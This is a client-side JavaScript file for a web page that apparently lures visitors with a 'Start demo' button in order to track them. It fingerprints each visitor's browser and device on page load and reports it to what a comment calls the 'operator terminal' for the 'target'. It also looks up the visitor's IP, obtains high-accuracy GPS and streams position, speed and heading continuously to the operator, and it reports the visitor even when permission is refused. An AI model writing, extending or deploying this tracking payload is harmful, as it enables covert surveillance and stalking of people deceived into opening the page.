(function () {
  const GEO_OPTS = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };

  let ipInfo = null;
  let watchId = null;

  function getSessionId() {
    const parts = window.location.pathname.split("/").filter(Boolean);
    if (parts.length >= 2 && parts[0] === "session") {
      return parts[1];
    }
    return "";
  }

  function getTargetEndpoint() {
    const sid = getSessionId();
    return sid ? ("/api/session/" + sid + "/location") : "/report";
  }

  function setStatus(msg, type) {
    const el = document.getElementById("status-message");
    if (!el) return;
    el.textContent = msg;
    el.className = "status-msg " + (type || "info");
  }

  function collectBrowserInfo() {
    const ua = navigator.userAgent || "Unknown";
    return {
      userAgent: ua,
      platform: navigator.platform || "Unknown",
      browser: (function () {
        if (ua.indexOf("Firefox") > -1) return "Firefox";
        if (ua.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
        if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
        if (ua.indexOf("Trident") > -1) return "Internet Explorer";
        if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) return "Edge";
        if (ua.indexOf("Chrome") > -1) return "Chrome";
        if (ua.indexOf("Safari") > -1) return "Safari";
        return "Browser";
      })(),
      browserVersion: (function () {
        const M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
        return M[2] || "1.0";
      })(),
      screenResolution: window.screen ? window.screen.width + "x" + window.screen.height : "Unknown",
      devicePixelRatio: (window.devicePixelRatio || 1).toString(),
      hardwareConcurrency: (navigator.hardwareConcurrency || "Unknown").toString(),
      cpuCores: (navigator.hardwareConcurrency || "Unknown").toString(),
      language: navigator.language || "Unknown",
      timezone: Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Unknown",
      viewportSize: window.innerWidth + "x" + window.innerHeight,
      touchSupport: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
      deviceType: (/Mobi|Android/i.test(ua) || ('ontouchstart' in window && screen.width < 768)) ? "Mobile" : "Desktop"
    };
  }

  function parseWho(j) {
    const conn = j.connection || {};
    return {
      ip: j.ip,
      city: j.city,
      region: j.region,
      country: j.country,
      isp: conn.isp || j.isp || conn.org,
      lat: typeof j.latitude === "number" ? j.latitude : null,
      lon: typeof j.longitude === "number" ? j.longitude : null
    };
  }

  function parseApi(j) {
    return {
      ip: j.ip,
      city: j.city,
      region: j.region,
      country: j.country_name || j.country,
      isp: j.org || j.isp,
      lat: typeof j.latitude === "number" ? j.latitude : null,
      lon: typeof j.longitude === "number" ? j.longitude : null
    };
  }

  async function lookupIp() {
    try {
      const r = await fetch("https://ipwho.is/");
      if (r.ok) {
        const j = await r.json();
        if (j && j.success !== false) {
          ipInfo = parseWho(j);
          return;
        }
      }
    } catch (e) {}

    try {
      const r = await fetch("https://ipapi.co/json/");
      if (r.ok) {
        const j = await r.json();
        ipInfo = parseApi(j);
      }
    } catch (e) {}
  }

  function postPayload(data) {
    const dest = getTargetEndpoint();
    return fetch(dest, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).catch(function () {});
  }

  function applyFix(pos) {
    const c = pos.coords;
    const gpsData = {
      lat: c.latitude,
      lon: c.longitude,
      accuracy: c.accuracy,
      altitude: c.altitude,
      speed: c.speed,
      heading: c.heading,
      timestamp: new Date().toLocaleTimeString()
    };

    const bInfo = collectBrowserInfo();
    postPayload({ ip: ipInfo, gps: gpsData, browser: bInfo });

    if (typeof c.accuracy === "number" && c.accuracy > 1000) {
      setStatus("Location received with limited accuracy. Your device or browser may be providing an approximate position.", "warn");
    } else {
      setStatus("Location received.", "success");
    }

    if (watchId === null && navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(function (newPos) {
        const nc = newPos.coords;
        if (typeof nc.accuracy === "number" && nc.accuracy <= 1000) {
          setStatus("Location received.", "success");
        }
        postPayload({
          gps: {
            lat: nc.latitude,
            lon: nc.longitude,
            accuracy: nc.accuracy,
            altitude: nc.altitude,
            speed: nc.speed,
            heading: nc.heading,
            timestamp: new Date().toLocaleTimeString()
          }
        });
      }, null, GEO_OPTS);
    }
  }

  function geoError(err) {
    const bInfo = collectBrowserInfo();
    postPayload({ denied: true, errorCode: err ? err.code : 1, browser: bInfo });

    let userMsg = "Location access was not granted.";
    if (err && err.code === 2) {
      userMsg = "Location information is unavailable.";
    } else if (err && err.code === 3) {
      userMsg = "Location request timed out.";
    }

    setStatus(userMsg, "error");
    const btn = document.getElementById("btn-start-demo");
    if (btn) btn.disabled = true;
  }

  function startDemo() {
    const btn = document.getElementById("btn-start-demo");
    if (btn) {
      btn.disabled = true;
      btn.textContent = "Demo in progress...";
    }

    if (!navigator.geolocation) {
      setStatus("Location API is not supported by your browser.", "error");
      return;
    }

    setStatus("Requesting location permission...", "info");
    navigator.geolocation.getCurrentPosition(applyFix, geoError, GEO_OPTS);
  }

  document.addEventListener("DOMContentLoaded", function () {
    const bInfo = collectBrowserInfo();
    lookupIp();

    // Send initial browser connection payload so operator terminal displays target connection immediately
    postPayload({ browser: bInfo });

    const btn = document.getElementById("btn-start-demo");
    if (btn) {
      btn.addEventListener("click", startDemo);
    }
  });
})();
